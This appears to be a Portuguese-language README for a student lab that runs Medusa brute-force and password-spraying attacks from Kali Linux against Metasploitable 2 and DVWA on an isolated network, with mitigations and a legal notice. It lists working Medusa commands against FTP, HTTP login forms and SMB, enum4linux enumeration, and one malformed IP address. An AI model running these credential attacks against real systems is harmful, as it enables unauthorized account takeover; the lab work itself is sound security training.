# Medusa Brute Force Lab — Kali Linux

## 1. Sobre o projeto

Este projeto tem como objetivo demonstrar, em ambiente controlado, como funcionam ataques de força bruta e password spraying utilizando Kali Linux e a ferramenta Medusa.

Os experimentos serão realizados em máquina virtual vulneráve (Metasploitable 2.0).

## 2. Objetivos

- Compreender o funcionamento de ataques de força bruta.
- Conhecer a ferramenta Medusa e seus módulos.
- Simular ataques contra FTP, HTTP e SMB.
- Criar e utilizar wordlists.
- Identificar vulnerabilidades de autenticação.
- Documentar evidências e resultados.
- Apresentar recomendações de segurança.

## 3. Ambiente utilizado

- Kali Linux (Sistema operacional atacante)
- Metasploitable 2 (Máquina virtual vulnerável)
- DVWA (Aplicação web vulnerável)
- VirtualBox (Virtualização)
- Medusa (Ferramenta de auditoria de autenticação)

*Rede (Placa de Rede exclusiva de hospedeiro (host-only))

## 4. Ferramentas

- Kali Linux
- Medusa
- Nmap
- VirtualBox
- DVWA
- Metasploitable 2

## 5. Experimentos realizados

- Configurar o ambiente: duas VMs (Kali Linux e Metasploitable 2) no VirtualBox, com rede interna (host-only).
- Executar ataques simulados: força bruta em FTP, automação de tentativas em formulário web (DVWA) e password spraying em SMB com enumeração de usuários.
- Documentar os testes: wordlists simples, comandos utilizados, validação de acessos e recomendações de mitigação.

### Comandos Utilizados

### 1. Criação de Wordlists
* `echo -e "user\nmsfadmin\nadmin\nroot" > users.txt`: Cria a lista de usuários fictícios separados por quebra de linha.
* `echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt`: Cria a lista de senhas para o ataque de força bruta.

### 2. Força Bruta e Ataque de Dicionário (Medusa)
* `medusa -h 192.168.56.103 -U users.txt -P pass.txt -M ftp -t 6`: Realiza um ataque de força bruta contra o serviço FTP do IP alvo, testando as combinações das wordlists.
* `medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http -m PAGE:"/dvwa/login.php" -m FORM:"username=^USER^&password=^PASS^&Login=Login" -m 'FAIL=Login failed' -t 6`: Executa ataque de força bruta no formulário de login HTTP da aplicação web (DVWA).

### 3. Conexão SSH / FTP
* `ftp 192.168.56.103`: Estabelece conexão interativa com o servidor FTP para validação das credenciais encontradas.

### 4. Enumeração de Sistema e Rede (SMB / Samba)
* `enum4linux -a 192.168.56.52.103 | tee enum4_output.txt`: Executa a enumeração completa de informações (usuários, compartilhamentos, políticas) em alvos Windows/Samba e salva a saída em arquivo.
* `medusa -h 192.168.56.102 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50`: Executa o ataque de força bruta especificamente contra o protocolo SMB (`smbnt`), definindo 2 threads (`-t 2`) e o limite de 50 tentativas por segundo/conexão (`-T 50`).
  
## 6. Medidas de mitigação

- Implementação de autenticação multifator (MFA).
- Utilização de senhas fortes e exclusivas.
- Limitação de tentativas de autenticação.
- Monitoramento de logs.
- Implementação de bloqueios progressivos.
- Desativação de serviços inseguros.
- Monitoramento de tentativas suspeitas de autenticação.
- Utilização de alertas em ferramentas SIEM.

## 7. Conclusão

A realização deste laboratório proporciona uma compreensão prática dos riscos relacionados à autenticação e às técnicas de força bruta.

Além de conhecer ferramentas utilizadas em testes de segurança, o projeto permite compreender como identificar comportamentos suspeitos e implementar medidas de proteção.

O conhecimento adquirido pode ser aplicado tanto em atividades de Pentest quanto em operações de defesa cibernética (Blue Team).

## 8. Aviso legal

Todos os experimentos foram planejados para ambientes virtuais próprios e isolados, com finalidade exclusivamente educacional.

Nenhum teste deve ser realizado contra sistemas, redes ou serviços sem autorização expressa.
